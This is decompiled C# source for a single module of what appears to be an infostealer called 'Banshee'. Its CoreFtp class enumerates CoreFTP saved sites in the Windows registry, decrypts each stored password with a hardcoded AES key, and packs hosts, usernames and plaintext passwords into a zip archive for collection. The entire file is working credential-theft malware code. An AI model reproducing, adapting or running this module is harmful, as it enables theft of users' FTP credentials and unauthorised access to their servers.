﻿using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using Banshee.Helper.Data;
using Microsoft.Win32;

namespace Banshee.Targets.Applications
{
	// Token: 0x02000092 RID: 146
	public class CoreFtp : ITarget
	{
		// Token: 0x060001B7 RID: 439 RVA: 0x0000E35C File Offset: 0x0000E35C
		public void Collect(InMemoryZip zip, Counter counter)
		{
			Counter.CounterApplications counterApplications = new Counter.CounterApplications();
			counterApplications.Name = "CoreFTP";
			using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\FTPWare\\COREFTP\\Sites"))
			{
				if (registryKey != null)
				{
					List<string> list = new List<string>();
					foreach (string name in from n in registryKey.GetSubKeyNames()
					orderby n
					select n)
					{
						try
						{
							using (RegistryKey registryKey2 = registryKey.OpenSubKey(name))
							{
								if (registryKey2 != null)
								{
									object value = registryKey2.GetValue("Host");
									object value2 = registryKey2.GetValue("User");
									object value3 = registryKey2.GetValue("PW");
									if (value != null)
									{
										string text = (value as string) ?? value.ToString();
										string text2;
										if ((text2 = (value2 as string)) == null)
										{
											text2 = (((value2 != null) ? value2.ToString() : null) ?? "");
										}
										string text3 = text2;
										string hexCipher;
										if ((hexCipher = (value3 as string)) == null)
										{
											hexCipher = (((value3 != null) ? value3.ToString() : null) ?? "");
										}
										string text4 = CoreFtp.DecryptCoreFtpPassword(hexCipher);
										list.Add(string.Concat(new string[]
										{
											"Url: ",
											text,
											":21\nUsername: ",
											text3,
											"\nPassword: ",
											text4,
											"\n"
										}));
										counterApplications.Files.Add(registryKey2.Name ?? "");
									}
								}
							}
						}
						catch
						{
						}
					}
					if (list.Count > 0)
					{
						zip.AddFile("CoreFTP\\Hosts.txt", Encoding.UTF8.GetBytes(string.Join("\n", list)));
						counter.Applications.Add(counterApplications);
					}
				}
			}
		}

		// Token: 0x060001B8 RID: 440 RVA: 0x0000E5A4 File Offset: 0x0000E5A4
		private static string DecryptCoreFtpPassword(string hexCipher)
		{
			byte[] bytes = Encoding.ASCII.GetBytes("hdfzpysvpzimorhk");
			byte[] iv = new byte[16];
			byte[] array = CoreFtp.HexToBytes(hexCipher);
			string @string;
			using (Aes aes = Aes.Create())
			{
				aes.KeySize = 128;
				aes.BlockSize = 128;
				aes.Key = bytes;
				aes.IV = iv;
				aes.Mode = CipherMode.ECB;
				aes.Padding = PaddingMode.Zeros;
				using (MemoryStream memoryStream = new MemoryStream())
				{
					using (ICryptoTransform cryptoTransform = aes.CreateDecryptor())
					{
						using (CryptoStream cryptoStream = new CryptoStream(memoryStream, cryptoTransform, CryptoStreamMode.Write))
						{
							cryptoStream.Write(array, 0, array.Length);
							cryptoStream.FlushFinalBlock();
							@string = Encoding.UTF8.GetString(memoryStream.ToArray());
						}
					}
				}
			}
			return @string;
		}

		// Token: 0x060001B9 RID: 441 RVA: 0x0000E6B0 File Offset: 0x0000E6B0
		private static byte[] HexToBytes(string hex)
		{
			int num = hex.Length / 2;
			byte[] array = new byte[num];
			for (int i = 0; i < num; i++)
			{
				array[i] = Convert.ToByte(hex.Substring(i * 2, 2), 16);
			}
			return array;
		}
	}
}
